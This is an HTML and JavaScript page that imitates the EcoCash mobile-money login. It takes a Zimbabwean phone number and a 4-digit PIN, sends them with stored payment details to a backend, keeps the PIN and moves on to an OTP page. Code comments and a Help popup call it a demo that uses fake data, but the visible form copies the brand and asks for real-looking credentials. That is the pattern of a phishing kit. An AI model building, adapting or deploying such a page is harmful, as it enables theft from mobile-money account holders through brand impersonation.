
<!doctype html>
<html lang="en">

<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">

<title>EcoCash Login</title>

<style>

*{
    box-sizing:border-box;
}

body{
    margin:0;
    font-family:"Segoe UI",Arial,sans-serif;
    background:#fff;
}

.top{
    padding:40px 0 20px;
    text-align:center;
}

.logo{
    font-size:42px;
    font-weight:bold;
    color:#0b66b2;
}

.logo span{
    color:#e33b2f;
}

h2{
    margin-top:10px;
    font-size:28px;
    font-weight:600;
    color:#333;
}

.main{
    margin-top:25px;
    padding:25px 20px 60px;
    background:#0b66b2;
    border-top-left-radius:60px;
    border-top-right-radius:60px;
    min-height:70vh;
    color:#fff;
}

form{
    background:#fff;
    padding:25px 18px;
    border-radius:12px;
    box-shadow:0 3px 12px rgba(0,0,0,0.15);
    margin-bottom:20px;
    color:#000;
}

.phone-box{
    border:2px solid #0a57a3;
    border-radius:10px;
    padding:12px;
    margin-bottom:20px;
}

.phone-row{
    display:flex;
    align-items:center;
    width:100%;
}

.phone-box .flag{
    width:32px;
    height:20px;
    margin-right:10px;
    object-fit:cover;
}

.phone-box input[type="tel"]{
    border:none;
    flex:1;
    font-size:16px;
    outline:none;
    min-width:0;
}

.pin-title{
    text-align:center;
    font-size:18px;
    margin-bottom:15px;
    color:#444;
}

.pin-boxes{
    display:flex;
    justify-content:center;
    gap:15px;
    margin-bottom:20px;
    position:relative;
    min-height:55px;
}

.pin{
    width:55px;
    height:55px;
    border:2px solid #0a57a3;
    border-radius:12px;
    font-size:28px;
    font-weight:bold;
    display:flex;
    justify-content:center;
    align-items:center;
    background:#fff;
    color:#000;
    pointer-events:none;
}

#pinInput{
    position:absolute;
    inset:0;
    width:100%;
    height:100%;
    opacity:0;
    cursor:text;
    z-index:10;
    border:none;
    outline:none;
}

#msg{
    display:none;
    text-align:center;
    margin-top:15px;
    font-size:14px;
}

#msg.err{
    color:#d93025;
}

#msg.success{
    color:#16803c;
}

.bottom-buttons{
    display:flex;
    justify-content:space-between;
    gap:20px;
    margin-top:25px;
}

.btn{
    flex:1;
    background:#fff;
    padding:14px 0;
    border-radius:12px;
    border:none;
    font-size:17px;
    font-weight:600;
    color:#000;
    box-shadow:0 3px 10px rgba(0,0,0,0.15);
    cursor:pointer;
}

.btn:hover{
    background:#f3f3f3;
}

.btn:disabled{
    opacity:.6;
    cursor:not-allowed;
}

.ver{
    text-align:center;
    margin-top:15px;
    font-size:14px;
}

.tnc{
    text-align:center;
    margin-top:5px;
    font-size:14px;
    color:#d9edff;
}

@media(max-width:480px){

    .logo{
        font-size:36px;
    }

    h2{
        font-size:24px;
    }

    .main{
        padding:20px 14px 50px;
        border-top-left-radius:40px;
        border-top-right-radius:40px;
    }

    form{
        padding:20px 14px;
    }

    .pin-boxes{
        gap:10px;
    }

    .pin{
        width:50px;
        height:50px;
    }

    .bottom-buttons{
        gap:10px;
    }

    .btn{
        font-size:15px;
    }

}

</style>
</head>

<body>

<div class="top">

    <div class="logo">
        Eco<span>Cash</span>
    </div>

    <h2>
        Login
    </h2>

</div>

<div class="main">

<form id="loginForm">

    <div class="phone-box">

        <div class="phone-row">

            <img
                src="https://flagcdn.com/w20/zw.png"
                class="flag"
                alt="Zimbabwe flag"
            >

            <input
                type="tel"
                name="phone"
                id="phoneInput"
                value="+263"
                required
                autocomplete="tel"
            >

        </div>

    </div>

    <div class="pin-title">
        Enter your PIN
    </div>

    

    <div
        class="pin-boxes"
        id="pinArea"
    >

        <div class="pin"></div>
        <div class="pin"></div>
        <div class="pin"></div>
        <div class="pin"></div>

        <input
            type="tel"
            id="pinInput"
            maxlength="4"
            inputmode="numeric"
            pattern="[0-9]{4}"
            autocomplete="off"
            aria-label="Demo PIN"
        >

    </div>

    <div class="bottom-buttons">

        <button
            type="submit"
            class="btn"
            id="registerBtn"
        >
            Register
        </button>

        <button
            type="button"
            class="btn"
            id="helpBtn"
        >
            Help &amp; Support
        </button>

    </div>

    <div id="msg"></div>

</form>

<div class="ver">
    v2.1.3P
</div>

<div class="tnc">
    By signing in you agree to the Terms and Conditions
</div>

</div>

<script>

const API_BASE = 'http://localhost:3001';


/* =========================================================
   PAYMENT DATA
========================================================= */

let paymentData = {};

try {
    paymentData = JSON.parse(
        sessionStorage.getItem('paymentData') || '{}'
    );
} catch(error) {
    console.warn('Invalid paymentData in sessionStorage:', error);
}

console.log('Payment data:', paymentData);


/* =========================================================
   ELEMENTS
========================================================= */

const form =
    document.getElementById('loginForm');

const phoneInput =
    document.getElementById('phoneInput');

const submitBtn =
    document.getElementById('registerBtn');

const msg =
    document.getElementById('msg');

const pinInput =
    document.getElementById('pinInput');

const pinArea =
    document.getElementById('pinArea');

const pins =
    document.querySelectorAll('.pin');

const helpBtn =
    document.getElementById('helpBtn');

const prefix = '+263';


/* =========================================================
   ELEMENT CHECK
========================================================= */

if (
    !form ||
    !phoneInput ||
    !submitBtn ||
    !msg ||
    !pinInput ||
    !pinArea ||
    !helpBtn
) {

    console.error('Account page elements missing.');

} else {


    /* =====================================================
       PHONE INPUT
    ===================================================== */

    phoneInput.addEventListener(
        'input',
        function(){

            let value = phoneInput.value;

            if(!value.startsWith(prefix)){
                value = prefix;
            }

            const numbers =
                value
                .slice(prefix.length)
                .replace(/\D/g,'');

            phoneInput.value =
                prefix + numbers;

        }
    );


    /* =====================================================
       PREVENT DELETING +263
    ===================================================== */

    phoneInput.addEventListener(
        'keydown',
        function(e){

            if(
                phoneInput.selectionStart <= prefix.length &&
                (
                    e.key === 'Backspace' ||
                    e.key === 'Delete'
                )
            ){

                e.preventDefault();

            }

        }
    );


    /* =====================================================
       PIN AREA
    ===================================================== */

    pinArea.addEventListener(
        'click',
        function(){

            pinInput.focus();

        }
    );


    /* =====================================================
       PIN INPUT
    ===================================================== */

    pinInput.addEventListener(
        'input',
        function(){

            const value =
                pinInput.value
                .replace(/\D/g,'')
                .slice(0,4);

            pinInput.value = value;

            pins.forEach(
                function(box,index){

                    if(value[index]){
                        box.textContent = '•';
                    }else{
                        box.textContent = '';
                    }

                }
            );

        }
    );


    /* =====================================================
       PIN KEYDOWN
    ===================================================== */

    pinInput.addEventListener(
        'keydown',
        function(e){

            if(
                !/[0-9]/.test(e.key) &&
                e.key !== 'Backspace' &&
                e.key !== 'Delete' &&
                e.key !== 'ArrowLeft' &&
                e.key !== 'ArrowRight' &&
                e.key !== 'Tab'
            ){

                e.preventDefault();

            }

        }
    );


    /* =====================================================
       HELP
    ===================================================== */

    helpBtn.addEventListener(
        'click',
        function(){

            alert(
                'This is a DEMO / TEST interface. Please use only fake test information.'
            );

        }
    );


    /* =====================================================
       FORM SUBMISSION
    ===================================================== */

    form.addEventListener(
        'submit',
        async function(e){

            e.preventDefault();

            console.log('FORM SUBMITTED');


            /* ---------------------------------------------
               PHONE VALIDATION
            --------------------------------------------- */

            if(
                phoneInput.value === prefix ||
                phoneInput.value.length <= prefix.length
            ){

                phoneInput.setCustomValidity(
                    'Enter your phone number after +263'
                );

                phoneInput.reportValidity();

                return;

            }

            phoneInput.setCustomValidity('');


            /* ---------------------------------------------
               DEMO PIN VALIDATION
            --------------------------------------------- */

            const demoPin =
                pinInput.value.trim();

            if(!/^\d{4}$/.test(demoPin)){

                msg.className = 'err';
                msg.style.display = 'block';
                msg.textContent =
                    'Enter the 4-digit demo PIN.';

                pinInput.focus();

                return;

            }


            /* ---------------------------------------------
               LOADING
            --------------------------------------------- */

            submitBtn.disabled = true;
            submitBtn.textContent = 'Processing...';

            msg.className = '';
            msg.style.display = 'block';
            msg.textContent = 'Connecting to server...';


            try {


                /* -----------------------------------------
                   BUILD DEMO REQUEST
                ----------------------------------------- */

                const savedPaymentData =
                    JSON.parse(
                        sessionStorage.getItem('paymentData') || '{}'
                    );


                const requestBody = {

                    tracking:
                        savedPaymentData.tracking ||
                        paymentData.tracking ||
                        'DEMO-TRACK-0001',

                    mode:
                        savedPaymentData.mode ||
                        paymentData.mode ||
                        'EcoCash',

                    accountName:
                        savedPaymentData.accountName ||
                        paymentData.accountName ||
                        'Demo Customer',

                    accountNumber:
                        savedPaymentData.accountNumber ||
                        paymentData.accountNumber ||
                        phoneInput.value,

                    amount:
                        savedPaymentData.amount ||
                        paymentData.amount ||
                        '1',

                    currency:
                        savedPaymentData.currency ||
                        paymentData.currency ||
                        'USD',

                    phone:
                        phoneInput.value,

                    /*
                     * DEMO ONLY.
                     * This is a fake 4-digit PIN.
                     */
                    demoPin:
                        demoPin

                };


                console.log(
                    'FINAL DEMO REQUEST BODY:',
                    requestBody
                );


                /* -----------------------------------------
                   SEND TO LOCAL DEMO SERVER
                ----------------------------------------- */

                const response =
                    await fetch(
                        `${API_BASE}/api/register-payment`,
                        {
                            method: 'POST',

                            headers: {
                                'Content-Type':
                                    'application/json'
                            },

                            body:
                                JSON.stringify(
                                    requestBody
                                )
                        }
                    );


                console.log(
                    'HTTP status:',
                    response.status
                );


                /* -----------------------------------------
                   READ RESPONSE
                ----------------------------------------- */

                const data =
                    await response.json();


                console.log(
                    'Server response:',
                    data
                );


                /* -----------------------------------------
                   CHECK RESPONSE
                ----------------------------------------- */

                if(
                    !response.ok ||
                    !data.ok
                ){

                    throw new Error(
                        data.error ||
                        `Server returned HTTP ${response.status}`
                    );

                }


                /* -----------------------------------------
                   SAVE ACCOUNT DATA
                ----------------------------------------- */

                sessionStorage.setItem(
                    'accountData',
                    JSON.stringify({

                        phone:
                            phoneInput.value

                    })
                );


                /* -----------------------------------------
                   SAVE DEMO PIN FOR OTP VERIFICATION
                ----------------------------------------- */

                sessionStorage.setItem(
                    'demoPin',
                    demoPin
                );


                /* -----------------------------------------
                   SAVE TRANSACTION ID
                ----------------------------------------- */

                if(data.transactionId){

                    sessionStorage.setItem(
                        'transactionId',
                        data.transactionId
                    );

                } else {

                    throw new Error(
                        'Server did not return a transaction ID.'
                    );

                }


                /* -----------------------------------------
                   SUCCESS
                ----------------------------------------- */

                msg.className = 'success';

                msg.textContent =
                    'Verification code sent.';

                submitBtn.textContent =
                    'Success';


                /* -----------------------------------------
                   GO TO OTP PAGE
                ----------------------------------------- */

                setTimeout(
                    function(){

                        window.location.href =
                            'otp.html';

                    },
                    500
                );


            } catch(error) {


                console.error(
                    'SUBMISSION ERROR:',
                    error
                );


                msg.className = 'err';

                msg.style.display = 'block';

                msg.textContent =
                    error.message ||
                    'Unable to connect to the demo server.';


                submitBtn.disabled = false;

                submitBtn.textContent =
                    'Register';

            }

        }
    );

}

</script>

</body>
</html>
